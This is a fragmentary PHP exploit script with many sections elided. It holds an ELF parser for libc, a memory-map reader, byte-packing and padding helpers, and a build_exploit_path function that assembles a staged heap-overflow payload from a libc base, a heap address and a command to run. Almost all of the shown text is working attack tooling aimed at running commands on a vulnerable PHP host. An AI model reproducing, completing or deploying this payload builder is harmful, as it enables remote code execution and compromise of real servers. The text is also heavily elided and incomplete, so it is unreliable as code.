...
class elf{
    ...
    {
        $this->elf_bin = new SplFileObject($elf_bin, "rb");
    }
    ...
    public function get($start,$len){
        $this->elf_bin->fseek($start);
        $data=$this->elf_bin->fread($len);
        $this->elf_bin->rewind();
...
//                    echo "who knows what $sh_type this is? ";
    ...
    public function packlli($value) {
        ...
        $result = '';
        for ($i = 0; $i < 4; $i++) {
            $result .= chr(($lower >> ($i * 8)) & 0xff);
        }
        for ($i = 0; $i < 4; $i++) {
            $result .= chr(($higher >> ($i * 8)) & 0xff);
        }
        return $result;
    }
...
function get_regions($maps_path) {
    ...
    $file = new SplFileObject($maps_path, 'r');
    if ($file) {
        while (!$file->eof()) {
            $line = $file->fgets();
            if ($line === false) {
...
function my_str_repeat($string, $times) {
    $result = '';
    for ($i = 0; $i < $times; $i++) {
        $result .= $string;
    }
...
function ljust($string, $length, $pad_char = ' ') {
    ...
    if ($pad_length > 0) {
        return $string . my_str_repeat($pad_char, $pad_length);
    } else {
        return $string;
    }
}
...
function build_exploit_path($libc, $libc_base, $heap, $command, $sleep =1 ,$padding = 20){
    ...
    $pad_size = CS - 0x18;
    $pad = my_str_repeat("\x00", $pad_size);
    ...
    $step1_size = 1;
    $step1 = my_str_repeat("\x00", $step1_size);
    ...
    $step2_size = 0x48;
    $step2 = my_str_repeat("\x00", ($step2_size + 8));
    ...
    $step3 = my_str_repeat("\x00", $step3_size);
    ...
    $step3_overflow = my_str_repeat("\x00", ($step3_size - strlen(BUG))) . BUG;
    ...
    $step4_size = CS;
    $step4 = "=00" . my_str_repeat("\x00", ($step4_size - 1));
    ...
    $pages = my_str_repeat($step4, 3)
        . $step4_pwn
        . $step4_custom_heap
        . $step4_use_custom_heap
        . $step3_overflow
        . my_str_repeat($pad, $padding)
        . my_str_repeat($step1, 3)
        . $step2_write_ptr
        . my_str_repeat($step2, 2);
